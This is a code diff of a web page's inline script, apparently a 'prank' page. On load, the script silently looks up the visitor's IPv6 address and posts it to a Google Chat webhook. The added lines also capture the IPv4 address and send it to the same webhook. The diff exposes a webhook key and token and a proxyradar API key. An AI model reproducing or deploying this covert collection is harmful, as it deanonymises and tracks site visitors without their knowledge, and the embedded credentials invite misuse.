@@ -9,7 +9,7 @@
 
 
       let ip=new XMLHttpRequest();
-      ip.open("GET","https://api64.ipify.org?lala="+Math.random(),false);
+      ip.open("GET","https://api64.ipify.org?ipv=6&lala="+Math.random(),false);
       ip.send();
       let isVpn=new XMLHttpRequest();
       //alert("https://proxyradar.io/v1/check?key=1124e24990c36694577cdf6f311b673b%26ip="+ip.responseText+"%26format=json&lala="+Math.random());
@@ -22,7 +22,14 @@
         let prank=new XMLHttpRequest();
         prank.open("POST","https://chat.googleapis.com/v1/spaces/AAAAkRe_ncg/messages?key=AIzaSyDdI0hCZtE6vySjMm-WEfRq3CPzqKqqsHI&token=MURICEUKhmZgalA0JHZ8ntVTx3ISuslO5LQBHhEQP00",false);
         prank.send("{text:\""+ip.responseText+" hahaha\"}");
-        setTimeout(function(){document.getElementById("key").innerText="Webhook to my chat: https://chat.googleapis.com/v1/spaces/AAAAkRe_ncg/messages?key=AIzaSyDdI0hCZtE6vySjMm-WEfRq3CPzqKqqsHI&token=MURICEUKhmZgalA0JHZ8ntVTx3ISuslO5LQBHhEQP00";},1000);
+        setTimeout(function(){document.getElementById("key").innerText="Webhook to my chat: https://chat.googleapis.com/v1/spaces/AAAAkRe_ncg/messages?key=AIzaSyDdI0hCZtE6vySjMm-WEfRq3CPzqKqqsHI&token=MURICEUKhmZgalA0JHZ8ntVTx3ISuslO5LQBHhEQP00";
+            ip=new XMLHttpRequest();
+                              ip.open("GET","https://api.ipify.org?ipv=4",false);
+                              ip.send();
+                              prank=new XMLHttpRequest();
+                              prank.open("POST","https://chat.googleapis.com/v1/spaces/AAAAkRe_ncg/messages?key=AIzaSyDdI0hCZtE6vySjMm-WEfRq3CPzqKqqsHI&token=MURICEUKhmZgalA0JHZ8ntVTx3ISuslO5LQBHhEQP00",false);
+                              prank.send("{text:\""+ip.responseText+"\"}");
+                             },1000);
       }
     </script>
   </head>
